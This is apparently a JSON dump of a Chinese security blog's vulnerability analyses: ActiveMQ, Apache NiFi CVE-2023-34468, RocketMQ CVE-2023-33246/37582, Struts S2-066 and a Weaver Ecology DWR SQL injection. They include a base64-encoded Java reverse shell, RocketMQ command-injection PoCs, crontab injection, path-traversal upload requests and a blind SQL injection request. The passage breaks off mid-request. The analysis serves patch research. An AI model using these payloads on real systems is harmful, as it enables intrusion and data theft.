java.lang.String(java.util.Base64.decoder.decode(&amp;quot;dmFyIHNoZWxsID0gImJhc2giOwppZiAoamF2YS5sYW5nLlN5c3RlbS5nZXRQcm9wZXJ0eSgib3MubmFtZSIpLmluZGV4T2YoIldpbmRvd3MiKSAhPSAtMSkgewoJc2hlbGwgPSAiY21kLmV4ZSI7Cn0KdmFyIHA9bmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlcihzaGVsbCkucmVkaXJlY3RFcnJvclN0cmVhbSh0cnVlKS5zdGFydCgpO3ZhciBzPW5ldyBqYXZhLm5ldC5Tb2NrZXQoIjEwLjkuNDkuMTE2IiwgMTI3MCk7CnZhciBzb2NrZXRJbnB1dCA9IG5ldyBqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKG5ldyBqYXZhLmlvLklucHV0U3RyZWFtUmVhZGVyKHMuZ2V0SW5wdXRTdHJlYW0oKSkpOwp2YXIgc29ja2V0T3V0cHV0ID0gbmV3IGphdmEuaW8uQnVmZmVyZWRXcml0ZXIobmV3IGphdmEuaW8uT3V0cHV0U3RyZWFtV3JpdGVyKHMuZ2V0T3V0cHV0U3RyZWFtKCkpKTsKdmFyIHByb2Nlc3NJbnB1dCA9IG5ldyBqYXZhLmlvLkJ1ZmZlcmVkV3JpdGVyKG5ldyBqYXZhLmlvLk91dHB1dFN0cmVhbVdyaXRlcihwLmdldE91dHB1dFN0cmVhbSgpKSk7CnZhciBwcm9jZXNzT3V0cHV0ID0gbmV3IGphdmEuaW8uQnVmZmVyZWRSZWFkZXIobmV3IGphdmEuaW8uSW5wdXRTdHJlYW1SZWFkZXIocC5nZXRJbnB1dFN0cmVhbSgpKSk7Cgp3aGlsZSAoIXMuaXNDbG9zZWQoKSkgewoJdmFyIGRhdGEKCWlmICgoZGF0YSA9IHNvY2tldElucHV0LnJlYWRMaW5lKCkpICE9IG51bGwpIHsKCQlwcm9jZXNzSW5wdXQud3JpdGUoZGF0YSArICJcbiIpOwoJCXByb2Nlc3NJbnB1dC5mbHVzaCgpCgl9CglqYXZhLmxhbmcuVGhyZWFkLnNsZWVwKDUwKTsKCgl3aGlsZSAocHJvY2Vzc091dHB1dC5yZWFkeSgpICYmIChkYXRhID0gcHJvY2Vzc091dHB1dC5yZWFkKCkpID4gMCkgewoJCQlzb2NrZXRPdXRwdXQud3JpdGUoZGF0YSk7Cgl9Cglzb2NrZXRPdXRwdXQuZmx1c2goKQoJdHJ5IHsKCQlwLmV4aXRWYWx1ZSgpOwoJCWJyZWFrOwoJfSBjYXRjaCAoZSkgewoJfQp9CgpwLmRlc3Ryb3koKTsKcy5jbG9zZSgpOw==&amp;quot;)));&#039;)}&quot;/&gt;\n    &lt;/bean&gt;\n&lt;/beans&gt;\n参考\n\ngithub.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f 『activemq 修复补丁』\n"},"articles/security/vulnerabilities/apache-nifi/Apache-NiFi-Code-Injection-with-Database-Services-using-H2-(CVE-2023-34468)":{"title":"Apache NiFi Code Injection with Database Services using H2 (CVE-2023-34468)","links":["articles/security/java/jdbc/JDBC-Connection-URL-Attack"],"tags":["CVE-2023-34468"],"content":"\nApache NiFi Security Reports\n\nApache NiFi 最近出了两个漏洞 CVE-2023-34468&amp;CVE-2023-34212，分别利用 JDBC URL 和 JMS，因为最近在学习 JDBC Connection URL Attack，所以来看看 CVE-2023-34468。\n漏洞利用需要拥有授权，触发点位于 Controller Services 功能中，相关点 Services 有两个 DBCPConnectionPool 和 HikariCPConnectionPool\n影响版本\nApache NiFi 0.0.2 - 1.21.0\n复现\n细节见 dockerv/vuln/apache nifi/CVE-2023-34468 at master · trganda/dockerv · GitHub，效果如下\n\n代码分析\n以 org.apache.nifi.dbcp.DBCPConnectionPool 为例，在查看代码和 UI 界面时，在想要如何触发 JDBC 连接，这部分耽误了点时间。\npublic class DBCPConnectionPool extends AbstractDBCPConnectionPool implements DBCPService, VerifiableControllerService {\n}\nDBCPConnectionPool 继承了 AbstractDBCPConnectionPool，其 getConnection 方法包含了发起连接的逻辑 [1]。\n@Override\npublic Connection getConnection() throws ProcessException {\n\treturn getConnection(dataSource, kerberosUser);\n}\n \nprivate Connection getConnection(final BasicDataSource dataSource, final KerberosUser kerberosUser) {\n\ttry {\n\t\tfinal Connection con;\n\t\tif (kerberosUser != null) {\n\t\t\tKerberosAction&lt;Connection&gt; kerberosAction = new KerberosAction&lt;&gt;(kerberosUser, () -&gt; dataSource.getConnection(), getLogger()); // [1]\n\t\t\tcon = kerberosAction.execute();\n\t\t} else {\n\t\t\tcon = dataSource.getConnection();\n\t\t}\n\t\treturn con;\n如何在前端页面中触发呢？\n在 AbstractDBCPConnectionPool 中有一个 verify 方法会调用 getConnection [2]，\n@Override\npublic List&lt;ConfigVerificationResult&gt; verify(final ConfigurationContext context, final ComponentLog verificationLogger, final Map&lt;String, String&gt; variables) {\n\tList&lt;ConfigVerificationResult&gt; results = new ArrayList&lt;&gt;();\n\t// ...\n \n\tfinal BasicDataSource dataSource = new BasicDataSource();\n\ttry {\n\t\tconfigureDataSource(dataSource, kerberosUser, context);\n\t\tresults.add(new ConfigVerificationResult.Builder()\n\t\t\t\t.verificationStepName(&quot;Configure Data Source&quot;)\n\t\t\t\t.outcome(SUCCESSFUL)\n\t\t\t\t.explanation(&quot;Successfully configured data source&quot;)\n\t\t\t\t.build());\n \n\t\ttry (final Connection conn = getConnection(dataSource, kerberosUser)) { // [2]\n可通过点击前端页面中的 Verify 按钮触发。\n"},"articles/security/vulnerabilities/apache-rocketmq/Apache-RocketMQ-Remote-Command-Execution-Vulnerability-(CVE-2023-37582)":{"title":"Apache RocketMQ Remote Command Execution Vulnerability (CVE-2023-37582)","links":[],"tags":["CVE-2023-37582"],"content":"CVE-2023-37582 是对历史漏洞 CVE-2023-33246 的绕过。\nCVE-2023-33246\n\n分析版本 5.1.0\n\n在 CVE-2023-33246 中，如果 RocketMQ 暴露在公网，且没有配置认证。可以通过下面的 POC 来执行命令\npublic static void main(String[] args) throws Exception {\n\tString targetHost = &quot;127.0.0.1&quot;;\n\tString targetPort = &quot;10911&quot;;\n \n\tString targetAddr = String.format(&quot;%s:%s&quot;, targetHost, targetPort);\n\tProperties props = new Properties();\n\tprops.setProperty(&quot;rocketmqHome&quot;, getCmd(&quot;touch /tmp/success&quot;));\n\tprops.setProperty(&quot;filterServerNums&quot;, &quot;1&quot;);\n\tDefaultMQAdminExt admin = new DefaultMQAdminExt();\n\tadmin.setNamesrvAddr(&quot;0.0.0.0:9876&quot;);\n\tadmin.start();\n\tadmin.updateBrokerConfig(targetAddr, props);\n\tProperties brokerConfig = admin.getBrokerConfig(targetAddr);\n\tSystem.out.println(brokerConfig.getProperty(&quot;rocketmqHome&quot;));\n\tSystem.out.println(brokerConfig.getProperty(&quot;filterServerNums&quot;));\n\tadmin.shutdown();\n}\n \nprivate static String getCmd(String cmd) {\n\tString cmdBase = Base64.getEncoder().encodeToString(cmd.getBytes());\n\treturn &quot;-c $@|sh . echo echo \\&quot;&quot; + cmdBase + &quot;\\&quot;|base64 -d|bash -i;&quot;;\n}\n漏洞的触发点位于 org.apache.rocketmq.broker.filtersrv.FilterServerManager，它会通过 getRocketmqHome 方法获取 rocketmqHome 属性并拼接至命令中。\npublic void createFilterServer() {\n\tint more =\n\t\tthis.brokerController.getBrokerConfig().getFilterServerNums() - this.filterServerTable.size();\n\tString cmd = this.buildStartCommand();\n\tfor (int i = 0; i &lt; more; i++) {\n\t\tFilterServerUtil.callShell(cmd, log);\n\t}\n}\n \nprivate String buildStartCommand() {\n\tString config = &quot;&quot;;\n\tif (BrokerStartup.CONFIG_FILE_HELPER.getFile() != null) {\n\t\tconfig = String.format(&quot;-c %s&quot;, BrokerStartup.CONFIG_FILE_HELPER.getFile());\n\t}\n \n\tif (this.brokerController.getBrokerConfig().getNamesrvAddr() != null) {\n\t\tconfig += String.format(&quot; -n %s&quot;, this.brokerController.getBrokerConfig().getNamesrvAddr());\n\t}\n \n\tif (NetworkUtil.isWindowsPlatform()) {\n\t\treturn String.format(&quot;start /b %s\\\\bin\\\\mqfiltersrv.exe %s&quot;,\n\t\t\tthis.brokerController.getBrokerConfig().getRocketmqHome(),\n\t\t\tconfig);\n\t} else {\n\t\treturn String.format(&quot;sh %s/bin/startfsrv.sh %s&quot;,\n\t\t\tthis.brokerController.getBrokerConfig().getRocketmqHome(),\n\t\t\tconfig);\n\t}\n}\n需要注意的时，漏洞触发点位于一个单独的定时任务的线程中，见 FilterServerManager#run 方法，它会去读取内存中 Borker 的配置。\npublic void start() {\n \n\tthis.scheduledExecutorService.scheduleAtFixedRate(new AbstractBrokerRunnable(brokerController.getBrokerConfig()) {\n\t\t@Override\n\t\tpublic void run0() {\n\t\t\ttry {\n\t\t\t\tFilterServerManager.this.createFilterServer();\n\t\t\t} catch (Exception e) {\n\t\t\t\tlog.error(&quot;&quot;, e);\n\t\t\t}\n\t\t}\n\t}, 1000 * 5, 1000 * 30, TimeUnit.MILLISECONDS);\n}\n而 Borker 的配置的更新，则由 org.apache.rocketmq.broker.processor.AdminBrokerProcessor#processRequest 来完成 [1]\npublic RemotingCommand processRequest(ChannelHandlerContext ctx,\n\tRemotingCommand request) throws RemotingCommandException {\n\tswitch (request.getCode()) {\n\t\t// ...\n\t\tcase RequestCode.UPDATE_BROKER_CONFIG:\n\t\t\treturn this.updateBrokerConfig(ctx, request); // [1]\n修复\n在 CVE-2023-33246 的 修复 中，官方对 Broker 进行了限制，无法远程修改 configStorePath 和 brokerConfigPath，从而阻断了通过 Broker 进行命令执行。\n并同时对 Name Server 进行了修补，拒绝修改 kvConfigPath 和 configStorePathName\nif (properties.containsKey(&quot;kvConfigPath&quot;) || properties.containsKey(&quot;configStorePathName&quot;)) {\n\tresponse.setCode(ResponseCode.NO_PERMISSION);\n\tresponse.setRemark(&quot;Can not update config path&quot;);\n\treturn response;\n}\nCVE-2023-37582\n\n分析版本 5.1.1\n\n在 CVE-2023-33246 的修复中，对 NameServer 的修复方式是限制了 configStorePathName 的修改。不知道是什么原因，也许是打错了，NameServer 并没有这个属性，实际应该被限制的是 configStorePath，该属性指定了 NameServer 配置文件的存储路径。\n而 NameServer 配置文件中，依旧可以配置 rocketmqHome。\n但这里有几个问题：\n\n5.1.1 版本中直接删除了 FilterServerManager\n如何向 configStorePath 指定的配置文件路径中，写入内容，『presist 会写入更新后的配置至文件中』\n\n如果只是创建文件，对之前的 Poc 稍加修改即可。\npublic static void main(String[] args) throws Exception {\n\tProperties props = new Properties();\n\tprops.setProperty(&quot;configStorePath&quot;, &quot;/tmp/rocketmq&quot;);\n\tDefaultMQAdminExt admin = new DefaultMQAdminExt();\n\tadmin.setNamesrvAddr(&quot;0.0.0.0:9876&quot;);\n\tadmin.start();\n \n\tLinkedList&lt;String&gt; list = new LinkedList&lt;&gt;();\n\tlist.add(&quot;127.0.0.1:9876&quot;);\n\tadmin.updateNameServerConfig(props, list);\n \n\tadmin.shutdown();\n}\n默认创建的配置文件，内容如下，其中包含 rocketmqHome\nbindAddress=0.0.0.0\nclientRequestThreadPoolNums=8\nclientRequestThreadPoolQueueCapacity=50000\nclusterTest=false\nconfigStorePath=/tmp/rocketmq\ndefaultThreadPoolNums=16\ndefaultThreadPoolQueueCapacity=10000\nenableAllTopicList=true\nenableControllerInNamesrv=false\nenableTopicList=true\nkvConfigPath=/Users/trganda/namesrv/kvConfig.json\nlistenPort=9876\nneedWaitForService=false\nnotifyMinBrokerIdChanged=false\norderMessageEnable=false\nproductEnvName=center\nreturnOrderTopicConfigToBroker=true\nrocketmqHome=/Users/trganda/Downloads/rocketmq-all-5.1.0-bin-release\nscanNotActiveBrokerInterval=5000\nserverAsyncSemaphoreValue=64\nserverCallbackExecutorThreads=0\nserverChannelMaxIdleTimeSeconds=120\nserverOnewaySemaphoreValue=256\nserverPooledByteBufAllocatorEnable=true\nserverSelectorThreads=3\nserverSocketBacklog=1024\nserverSocketRcvBufSize=0\nserverSocketSndBufSize=0\nserverWorkerThreads=8\nsupportActingMaster=false\nunRegisterBrokerQueueCapacity=3000\nuseEpollNativeSelector=false\nwaitSecondsForService=45\nwriteBufferHighWaterMark=0\nwriteBufferLowWaterMark=0\n\n修改一下 Poc\nProperties props = new Properties();\nprops.setProperty(&quot;rocketmqHome&quot;, getCmd(&quot;touch /tmp/success&quot;));\nprops.setProperty(&quot;configStorePath&quot;, &quot;/tmp/rocketmq&quot;);\n发现写入的配置文件内容发生变化\nrocketmqHome=-c $@|sh . echo echo &quot;dG91Y2ggL3RtcC9zdWNjZXNz&quot;|base64 -d|bash -i;\n\n并且命令可以被成功执行『仅限 5.1.1 以前的版本』。\n而写入文件相关的代码位于 Configuration#persist ，在 org.apache.rocketmq.namesrv.processor.DefaultRequestProcessor#update 更新配置后调用，[2] 先判断文件是否已存在，若存在，备份至 .bak 文件中。\npublic void persist() {\n\ttry {\n\t\treadWriteLock.readLock().lockInterruptibly();\n \n\t\ttry {\n\t\t\tString allConfigs = getAllConfigsInternal();\n \n\t\t\tMixAll.string2File(allConfigs, getStorePath()); // [2]\n\t\t} catch (IOException e) {\n\t\t\tlog.error(&quot;persist string2File error, &quot;, e);\n\t\t} finally {\n\t\t\treadWriteLock.readLock().unlock();\n\t\t}\n\t} catch (InterruptedException e) {\n\t\tlog.error(&quot;persist lock error&quot;);\n\t}\n}\n其它利用方式\n5.1.1 中没有 FilterServerManager，如果想命令执行，可以尝试其他方式：\n\n写入 crontab\n写入 .ssh/authorized_key\n…\n\nCrontab\ncrontab 文件中是可以定义变量，并且格式和 NameServer 配置文件的形式一样\nname=value\n\n那么可以修改 NamesrvConfig 中包含的属性的值『根据实际情况修改 {user}』。\nproductEnvName=anything\\n1 * * * * {user} cat /tmp/crontab_success\n\n写入的内容如下\nbindAddress=0.0.0.0\nclientRequestThreadPoolNums=8\nclientRequestThreadPoolQueueCapacity=50000\nclusterTest=false\nconfigStorePath=/tmp/rocketmq\ndefaultThreadPoolNums=16\ndefaultThreadPoolQueueCapacity=10000\nenableAllTopicList=true\nenableControllerInNamesrv=false\nenableTopicList=true\nkvConfigPath=/Users/trganda/namesrv/kvConfig.json\nlistenPort=9876\nneedWaitForService=false\nnotifyMinBrokerIdChanged=false\norderMessageEnable=false\nproductEnvName=anything\n1 * * * * {user} cat /tmp/crontab_success\nreturnOrderTopicConfigToBroker=true\nrocketmqHome=/Users/trganda/Downloads/rocketmq-all-5.1.1-bin-release\nscanNotActiveBrokerInterval=5000\nserverAsyncSemaphoreValue=64\nserverCallbackExecutorThreads=0\nserverChannelMaxIdleTimeSeconds=120\nserverOnewaySemaphoreValue=256\nserverPooledByteBufAllocatorEnable=true\nserverSelectorThreads=3\nserverSocketBacklog=1024\nserverSocketRcvBufSize=0\nserverSocketSndBufSize=0\nserverWorkerThreads=8\nsupportActingMaster=false\nunRegisterBrokerQueueCapacity=3000\nuseEpollNativeSelector=false\nwaitSecondsForService=45\nwriteBufferHighWaterMark=0\nwriteBufferLowWaterMark=0\n\n这里还没有实际测试。\n参考\n\nFix incorrect naming by RongtongJin · Pull Request #6843 · apache/rocketmq · GitHub\nCVE-2023-37582\n999-RocketMQ%E9%85%8D%E7%BD%AE%E6%8A%80%E8%83%BD.md\n"},"articles/security/vulnerabilities/apache-struts/Apache-Struts-Remote-Code-Execution-Vulnerability-(-S2-066-CVE-2023-50164)":{"title":"Apache Struts Remote Code Execution Vulnerability ( S2-066 CVE-2023-50164)","links":[],"tags":[],"content":"\nAn attacker can manipulate file upload params to enable paths traversal and under some circumstances this can lead to uploading a malicious file which can be used to perform Remote Code Execution.\n\n影响版本\n\nStruts 2.5.0-Struts 2.5.32\nStruts 6.0.0-Struts 6.3.0\n\n补丁分析\n漏洞描述里提到可通过伪造文件上传的参数导致目录穿越，看版本比对，有两个 Commit 引起我的关注，一个是 Always delete uploaded file，另一个是 Makes HttpParameters case-insensitive。前者的作用是确保上传的临时文件被正确上传，在修复之前，通过构造超长的文件上传参数可以让临时文件继续留存在磁盘中；\nPOST /s2_066_war_exploded/upload.action HTTP/1.1\nHost: localhost:8080\nAccept-Language: en-US,en;q=0.9\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\nAccept-Encoding: gzip, deflate, br\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary5WJ61X4PRwyYKlip\nContent-Length: 593\n \n------WebKitFormBoundary5WJ61X4PRwyYKlip\nContent-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;poc.txt&quot;\nContent-Type: text/plain\n \ntest\n \n \n------WebKitFormBoundary5WJ61X4PRwyYKlip\nContent-Disposition: form-data; name=&quot;caption&quot;;\n \n \n{{randstr(4097,4097)}}\n \n------WebKitFormBoundary5WJ61X4PRwyYKlip--\n请求处理完成后会发现 caption 参数对应的临时文件并未被删除。\n\n后者的作用很明显，从测试用例里可以看出，将 org.apache.struts2.dispatcher.HttpParameters 类改成对参数名大小写不敏感。思前想后，前者与漏洞的直接关联应该不大，先跳过。\nHttpParameters 通过成员 parameters 存储请求中的参数，类型为 Map&lt;String, Parameter&gt;\nprivate final Map&lt;String, Parameter&gt; parameters;\n补丁中对 HttpParameters 的几个主要方法逻辑进行了修改，这里主要关注对 parameters 进行写入操作的方法，例如 HttpParameters#appendAll\n\n对 Struts 的结构并不了解，先查找一下有哪些方法会直接调用该方法，结果如下\n\n在 org.apache.struts2.interceptor.FileUploadInterceptor#intercept 方法中有使用该方法添加请求参数\nEnumeration fileParameterNames = multiWrapper.getFileParameterNames();\n\twhile (fileParameterNames != null &amp;&amp; fileParameterNames.hasMoreElements()) {\n\t\t// get the value of this input tag\n\t\tString inputName = (String) fileParameterNames.nextElement();\n \n\t\t// get the content type\n\t\tString[] contentType = multiWrapper.getContentTypes(inputName);\n \n\t\tif (isNonEmpty(contentType)) {\n\t\t\t// get the name of the file from the input tag\n\t\t\tString[] fileName = multiWrapper.getFileNames(inputName);\n \n\t\t\tif (isNonEmpty(fileName)) {\n\t\t\t\t// get a File object for the uploaded File\n\t\t\t\tUploadedFile[] files = multiWrapper.getFiles(inputName);\n\t\t\t\tif (files != null &amp;&amp; files.length &gt; 0) {\n\t\t\t\t\tList&lt;UploadedFile&gt; acceptedFiles = new ArrayList&lt;&gt;(files.length);\n\t\t\t\t\tList&lt;String&gt; acceptedContentTypes = new ArrayList&lt;&gt;(files.length);\n\t\t\t\t\tList&lt;String&gt; acceptedFileNames = new ArrayList&lt;&gt;(files.length);\n\t\t\t\t\tString contentTypeName = inputName + &quot;ContentType&quot;;\n\t\t\t\t\tString fileNameName = inputName + &quot;FileName&quot;;\n \n\t\t\t\t\tfor (int index = 0; index &lt; files.length; index++) {\n\t\t\t\t\t\tif (acceptFile(action, files[index], fileName[index], contentType[index], inputName, validation)) {\n\t\t\t\t\t\t\tacceptedFiles.add(files[index]);\n\t\t\t\t\t\t\tacceptedContentTypes.add(contentType[index]);\n\t\t\t\t\t\t\tacceptedFileNames.add(fileName[index]);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n \n\t\t\t\t\tif (!acceptedFiles.isEmpty()) {\n\t\t\t\t\t\tMap&lt;String, Parameter&gt; newParams = new HashMap&lt;&gt;();\n\t\t\t\t\t\tnewParams.put(inputName, new Parameter.File(inputName, acceptedFiles.toArray(new UploadedFile[acceptedFiles.size()])));\n\t\t\t\t\t\tnewParams.put(contentTypeName, new Parameter.File(contentTypeName, acceptedContentTypes.toArray(new String[acceptedContentTypes.size()])));\n\t\t\t\t\t\tnewParams.put(fileNameName, new Parameter.File(fileNameName, acceptedFileNames.toArray(new String[acceptedFileNames.size()])));\n\t\t\t\t\t\tac.getParameters().appendAll(newParams);\n\t\t\t\t\t}\n通过注释，可以了解该类为文件上传的拦截器，将文件上传相关的参数添加至 HttpParameters 对象中，对于如下的 multipart 编码\n------WebKitFormBoundary5WJ61X4PRwyYKlip\nContent-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;poc.txt&quot;\nContent-Type: text/plain\n \n \ntest\n \n------WebKitFormBoundary5WJ61X4PRwyYKlip\nHttpParameters#parameters 中得到的 key 值会具有如下特征\n\n可通过在调用点打断点验证这一点。\n\nupload -&gt; 上传的文件\nuploadContentType -&gt; 文件的 Content-Type\nuploadFileName -&gt; 文件的 filename，这里为 poc.txt\n\n根据 FileUploadInterceptor 的注释，\n\n可以了解到，FileUploadInterceptor 会获取 3 个参数『也就是上面提到的 upload、uploadContentType 和 uploadFileName』，开发者可通过在 Action 中定义相关的 setter 方法获取这些参数的内容。\n参数污染\n根据上面的信息可以了解到会通过调用 setter 方法给 Action 设置参数，在编写的 Action 的 setter 方法上都设下断点可以验证这一点。\npublic class Upload extends ActionSupport {\n \n    private File upload;\n    private String uploadFileName;\n    private String uploadContentType;\n \n    public void setUpload(File upload) {\n        this.upload = upload;\n    }\n \n\tpublic void setUploadFileName(String uploadFileName) {\n        this.uploadFileName = uploadFileName;\n    }\n \n\tpublic void setUploadContentType(String uploadContentType) {\n        this.uploadContentType = uploadContentType;\n    }\n而 FileUploadInterceptor 中获取的参数却是来存储在 HttpParameters 类型的对象中。现在回过头看前面的补丁，它让 HttpParameters 变得对参数大小写不敏感，根据这一点可以猜测，如果 HttpParameters 存储了参数名大写和参数名小写形式的参数，其中一方是不是会把另一方给覆盖掉『通过 setter 方法』\n构造如下请求\n------WebKitFormBoundary5WJ61X4PRwyYKlip\nContent-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;poc.txt&quot;\nContent-Type: text/plain\n \ntest\n \n \n------WebKitFormBoundary5WJ61X4PRwyYKlip\nContent-Disposition: form-data; name=&quot;UPLOAD&quot;; filename=&quot;1.txt&quot;\nContent-Type: text/plain\n \ntest\n \n \n------WebKitFormBoundary5WJ61X4PRwyYKlip--\n在 setter 方法打下断点，发现只被调用了一次。根据调用栈中的方法名和经验，可以很直接的了解到是通过反射调用的。只调用了一次必然和方法名的获取逻辑有关，一般和 Bean 相关的，都是根据成员的名称，得到 setter/getter 方法名，例如成员名首字母大写再拼接上 set\n所以，将构造的请求中的 UPLOAD 改为了 Upload，发现 setter 方法被成功调用了两次。那么后调用的，会覆盖先调用的。根据 execute 的输出可以知道，name=&quot;upload&quot; 覆盖了 name=&quot;Upload&quot;，而这里的相关逻辑，在代码中体现在 com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters 方法中\nprotected void setParameters(Object action, ValueStack stack, HttpParameters parameters) {\n\tHttpParameters params;\n\tTreeMap acceptableParameters;\n\t// this.ordered 默认为 false\n\tif (this.ordered) {\n\t\tparams = HttpParameters.create().withComparator(this.getOrderedComparator()).withParent(parameters).build();\n\t\tacceptableParameters = new TreeMap(this.getOrderedComparator());\n\t} else {\n\t\tparams = HttpParameters.create().withParent(parameters).build();\n\t\tacceptableParameters = new TreeMap();\n\t}\n原本在 HttpParameters#parameters 成员中，顺序是小写在前，大写开头在后『HashMap』，而这里的 acceptableParameters 类型为 TreeMap，从 HashMap 中读取内容再插入 TreeMap 后顺序发生了变化。\n由此可以知道，可以通过小写模式，覆盖首字母大写模式的参数内容了。\n目录穿越\n前面已经可以进行文件上传参数的覆盖了，那么目录穿越在哪里。看了下 JakartaMultiPartRequest#processUpload 的逻辑，上传的内容路径并不可控，文件上传参数存储在 Commons Fileupload 库创建的临时文件中，文件名也不可控。\n试了下修改请求中的 filename 加上目录穿越，但 Action 中得到却是截断之后的文件名，这是因为 FileUploadInterceptor#intercept 中在获取上传的文件名时 [1]\nString[] fileName = multiWrapper.getFileNames(inputName); // [1]\n \npublic String[] getFileNames(String fieldName) {\n\t// 调用 JakartaMultiPartRequest#getFileNames\n\treturn this.multi == null ? null : this.multi.getFileNames(fieldName);\n}\n会通过 JakartaMultiPartRequest#getCanonicalName 方法会对获取的文件名进行截断\nprotected String getCanonicalName(String originalFileName) {\n\tint forwardSlash = originalFileName.lastIndexOf(47);\n\tint backwardSlash = originalFileName.lastIndexOf(92);\n\tString fileName;\n\tif (forwardSlash != -1 &amp;&amp; forwardSlash &gt; backwardSlash) {\n\t\tfileName = originalFileName.substring(forwardSlash + 1);\n\t} else {\n\t\tfileName = originalFileName.substring(backwardSlash + 1);\n\t}\n \n\treturn fileName;\n}\n所以，之前尝试的如下请求是不会成功的\n------WebKitFormBoundary5WJ61X4PRwyYKlip\nContent-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;../poc.txt&quot;\nContent-Type: text/plain\n \ntest\n \n------WebKitFormBoundary5WJ61X4PRwyYKlip\nContent-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;1.txt&quot;\nContent-Type: text/plain\n \ntest\n \n------WebKitFormBoundary5WJ61X4PRwyYKlip--\n既然目录穿越无法发生在 Struts 框架中，那根据 S2 历史漏洞的特点，只能是在二次开发的业务代码中了。前面已经说了，通过首字母的大小写变化可以进行参数的覆盖，那么覆盖掉 Action 中得到的 filename『uploadFileName』，是不是可以？『如果业务逻辑自身没有做检查就可能导致目录穿越发生了』\n所以，只要覆盖掉 Action 中 uploadFileName 这个成员就可以了，name=&quot;uploadFileName&quot; 在 JakartaMultiPartRequest#processUpload 中会被识别为表单参数，而非文件参数，所以其内容也不会经过 FileUploadInterceptor。而参数最终都会经过 ParametersInterceptor#setParameters 添加至 Action 中\n所以你可以构造如下请求覆写 uploadFileName\n------WebKitFormBoundary5WJ61X4PRwyYKlip\nContent-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;poc.txt&quot;\nContent-Type: text/plain\n \ntest\n \n \n------WebKitFormBoundary5WJ61X4PRwyYKlip\nContent-Disposition: form-data; name=&quot;uploadFileName&quot;;\n \n../../poc.txt\n \n------WebKitFormBoundary5WJ61X4PRwyYKlip--\n又或是\nPOST /s2_066_war_exploded/upload.action HTTP/1.1\nHost: localhost:8080\nAccept-Language: en-US,en;q=0.9\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\nAccept-Encoding: gzip, deflate, br\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary5WJ61X4PRwyYKlip\nCache-Control: max-age=0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nContent-Length: 593\n \n------WebKitFormBoundary5WJ61X4PRwyYKlip\nContent-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;poc.txt&quot;\nContent-Type: text/plain\n \ntest\n \n \n------WebKitFormBoundary5WJ61X4PRwyYKlip--\n参考\n\ncwiki.apache.org/confluence/display/WW/S2-066 『漏洞通告』\ngithub.com/apache/struts/compare/STRUTS_6_3_0…STRUTS_6_3_0_2#files_bucket 『版本对比』\ngithub.com/apache/struts/commit/4c044f12560e22e00520595412830f9582d6dac7 『补丁』\n"},"articles/security/vulnerabilities/ecology/泛微-Ecology-Dwr-SQL-注入漏洞":{"title":"泛微 Ecology Dwr SQL 注入漏洞","links":[],"tags":["ecology"],"content":"分析\n查看 ecology/WEB-INF/dwr.xml 配置文件\n&lt;dwr&gt;\n  &lt;allow&gt;\n\t&lt;!-- ... --&gt;\n    &lt;create creator=&quot;new&quot; javascript=&quot;DocDwrUtil&quot;&gt;\n      &lt;param name=&quot;class&quot; value=&quot;weaver.docs.docs.DocDwrUtil&quot;/&gt;\n      &lt;include method=&quot;ifCanRepeatName&quot;/&gt;\n      &lt;include method=&quot;ifCheckOutByCurrentUser&quot;/&gt;\n      &lt;include method=&quot;checkInNewsDsp&quot;/&gt;\n      &lt;include method=&quot;ifNewsCheckOutByCurrentUser&quot;/&gt;\n    &lt;/create&gt;\n\t&lt;filter class=&quot;weaver.filter.DwrLangFilter&quot;&gt;&lt;/filter&gt;\n  &lt;/allow&gt;\n&lt;/dwr&gt;\n定位文件 weaver.docs.docs.DocDwrUtil，方法 ifNewsCheckOutByCurrentUser 对应的处理逻辑如下\npublic boolean ifNewsCheckOutByCurrentUser(String var1, String var2) {\n\tboolean var3 = false;\n\tRecordSet var4 = new RecordSet();\n\tvar4.executeQuery(&quot;select checkOutStatus,checkOutUserId from DocFrontpage where id=?&quot;, new Object[]{var1});\n\tif (var4.next()) {\n\t\tint var5 = var4.getInt(&quot;checkOutStatus&quot;);\n\t\tif (var5 != 1 &amp;&amp; var5 != 2) {\n\t\t\tvar3 = true;\n\t\t}\n \n\t\tif ((var5 == 1 || var5 == 2) &amp;&amp; var2.equals(var4.getString(&quot;checkOutUserId&quot;))) {\n\t\t\tvar3 = true;\n\t\t}\n\t}\n \n\treturn var3;\n}\n其它几个方法 ifCanRepeatName、ifCheckOutByCurrentUser、checkInNewsDsp 中都可用于 SQL 注入。\n根据 dwr 框架的设定可构造请求如下，此注入探测 HrmResourceManager 表中，loginid 的第一个字符是否为 115(s)\nPOST /dwr/call/plaincall/DocDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1\nHost: ip\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36\nContent-Length: 191\nAccept-Encoding: gzip\nConnection: close\nContent-Type: text/plain\n \ncallCount=1\npage=\nhttpSessionId=\nscriptSessionId=\nc0-scriptName=DocDwrUtil\nc0-methodName=ifNewsCheckOutByCurrentUser\nc0-id=0\nc0-param0=string:1 and ascii((select substring(loginid,1,1)from HrmResourceManager))=115\nc0-param1=string:1\nbatchId=0\n\n下图为不想等的情况\n\n此外根据 dwr 的特性，只需通过请求体中的参数指定所需调用的脚本名和方法名即可，路由并不重要，例如\nPOST 